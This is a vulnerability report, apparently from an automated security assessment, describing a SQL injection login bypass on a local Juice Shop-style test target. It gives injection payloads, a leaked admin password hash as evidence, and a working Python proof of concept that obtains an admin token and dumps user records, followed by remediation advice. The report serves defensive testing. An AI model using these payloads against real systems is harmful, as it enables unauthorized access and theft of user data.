# SQL Injection Authentication Bypass via Email Parameter in /rest/user/login

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-09-04 15:24:15 UTC
**Target:** http://host.docker.internal:3100
**Endpoint:** /rest/user/login
**Method:** POST
**CWE:** CWE-89
**CVSS:** 9.8
**Confidence:** High
**Fix Effort:** Low

## Description

The login endpoint at `/rest/user/login` is vulnerable to SQL injection through the email parameter. An attacker can bypass authentication using boolean-based SQL injection (`' OR 1=1 --`), allowing login as any user (including admin) without knowing the password.

## Evidence

HTTP request to /rest/user/login with SQL injection payload returns HTTP 200 status with valid JWT token containing admin user credentials. The token payload includes id=1, email=admin@juice-sh.op, role=admin, and password hash (0192023a7bbd73250516f069df18b500). Normal login attempts with invalid credentials return HTTP 401 with "Invalid email or password" message, but SQL injection payload bypasses this check entirely. The backend database is identified as SQLite from error messages in other endpoints.

## Impact

Complete authentication bypass allowing unauthenticated attackers to gain admin access. Attackers can obtain valid JWT tokens for any user account, access all user data (including password hashes), and perform administrative actions without providing valid credentials.

## Counterevidence

No parameterized query validation found in the login flow. No Web Application Firewall (WAF) blocking SQL injection patterns. No input validation that would prevent single quotes in email parameters. No rate limiting observed on login endpoint. The vulnerability is consistently reproducible across multiple injection payloads (tested: ' OR 1=1 --, ' OR '1'='1, variations work reliably).

## What Would Change This Severity

This is already rated critical as authentication bypass with admin access is confirmed. Severity would remain critical in any deployment. No conditions would lower this rating as the vulnerability is a complete authentication bypass.

## Technical Analysis

The login endpoint constructs a SQL query using the email parameter without proper parameterization. The vulnerable code appears to construct a query like: `SELECT * FROM users WHERE email = '{email}'` where the email parameter is directly interpolated into the query string. By injecting `' OR 1=1 --`, the query becomes `SELECT * FROM users WHERE email = '' OR 1=1 --'`, which returns the first user record (admin) regardless of the password check. The application then generates a valid JWT token containing full user credentials including password hashes, role, and other sensitive data.

## Proof of Concept

1. Send a POST request to /rest/user/login with JSON body containing the SQL injection payload in the email field
2. Use payload: `' OR 1=1 --` in the email parameter with any password value
3. The server returns HTTP 200 with a valid JWT token for the admin user
4. Decode the JWT token to view admin credentials including ID, email, password hash, and role
5. Use the token in Authorization header to access protected endpoints like /api/users
6. Successfully retrieve all user records from the database

```python
#!/usr/bin/env python3
import requests
import json
import base64

BASE_URL = "http://host.docker.internal:3100"

# Step 1: Execute SQL injection
payload = {
    "email": "' OR 1=1 --",
    "password": "anything"
}

resp = requests.post(BASE_URL + "/rest/user/login", json=payload)

if resp.status_code == 200:
    data = resp.json()
    token = data["authentication"]["token"]
    
    # Decode JWT to show admin access
    parts = token.split('.')
    payload_b64 = base64.urlsafe_b64decode(parts[1] + "==")
    payload_data = json.loads(payload_b64)
    
    print("Successfully bypassed authentication!")
    print(f"Admin ID: {payload_data['data']['id']}")
    print(f"Admin Email: {payload_data['data']['email']}")
    print(f"Admin Role: {payload_data['data']['role']}")
    print(f"Password Hash: {payload_data['data']['password']}")
    print(f"JWT Token: {token[:80]}...")
    
    # Step 2: Use token to access protected endpoint
    headers = {"Authorization": f"Bearer {token}"}
    users_resp = requests.get(BASE_URL + "/api/users", headers=headers)
    
    if users_resp.status_code == 200:
        print(f"\nAccessed /api/users endpoint")
        users = users_resp.json()['data']
        print(f"Retrieved {len(users)} user records")
        for user in users[:3]:
            print(f"  - {user['email']} (Role: {user['role']})")
```

## Remediation

1. Use parameterized queries (prepared statements) for all database operations. Replace string interpolation with query parameters that prevent SQL syntax from being interpreted as part of the query. 2. Implement input validation and sanitization on all user-supplied inputs before using them in database queries. 3. Use an ORM (Object-Relational Mapping) framework that handles parameterization automatically. 4. Apply the principle of least privilege to database user accounts used by the application. 5. Implement rate limiting and account lockout mechanisms on the login endpoint to slow down brute force and injection attacks. 6. Add comprehensive logging and alerting for suspicious login attempts.

## Assumptions

Assumes a basic email/password login flow where user input is directly used in SQL queries. Assumes the database returns user records when the WHERE condition is satisfied, and the application uses the first record for token generation.
